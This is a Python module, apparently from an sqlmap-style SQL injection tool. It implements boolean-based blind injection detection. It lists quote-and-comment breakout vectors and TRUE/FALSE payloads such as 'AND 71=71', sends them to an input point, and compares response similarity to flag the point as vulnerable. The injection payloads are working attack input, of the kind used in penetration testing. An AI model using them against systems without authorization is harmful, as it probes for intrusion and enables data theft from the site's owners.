"""Boolean-based blind detection via differential true/false responses."""
from sqldark.techniques import Technique, Result, similarity

# (prefix, suffix) wrappers around the TRUE/FALSE condition
VECTORS = [
    ("", ""),
    ("'", "-- -"),
    ("'", "'"),
    ("\"", "-- -"),
    (")", "-- -"),
    ("')", "-- -"),
    ("'))", "-- -"),
    (" ", ""),
]

TRUE_COND = "AND {a}={a}"
FALSE_COND = "AND {a}={b}"


class BooleanBlind(Technique):
    name = "boolean-based blind"
    letter = "B"

    def test(self, point, baseline):
        for prefix, suffix in VECTORS:
            true_p = f"{prefix} {TRUE_COND.format(a=71)} {suffix}"
            false_p = f"{prefix} {FALSE_COND.format(a=71, b=72)} {suffix}"

            rt = self._send(point, true_p)
            rf = self._send(point, false_p)
            if rt.status < 0 or rf.status < 0:
                continue

            sim_tb = similarity(rt.text, baseline.text)   # true vs baseline -> high
            sim_fb = similarity(rf.text, baseline.text)   # false vs baseline -> low
            sim_tf = similarity(rt.text, rf.text)         # true vs false -> low

            if sim_tb >= 0.95 and sim_tf <= 0.92 and sim_fb <= sim_tb - 0.03:
                self.log.ok(
                    f"boolean-blind: TRUE~base={sim_tb:.3f} "
                    f"FALSE~base={sim_fb:.3f} TRUE~FALSE={sim_tf:.3f} "
                    f"[{prefix!r}..{suffix!r}]")
                return Result(self.name, point, vulnerable=True,
                              payload=f"{prefix} AND <cond> {suffix}",
                              detail={"prefix": prefix, "suffix": suffix,
                                      "sim_true_base": round(sim_tb, 3),
                                      "sim_false_base": round(sim_fb, 3)},
                              confidence=0.9)
        return Result(self.name, point)
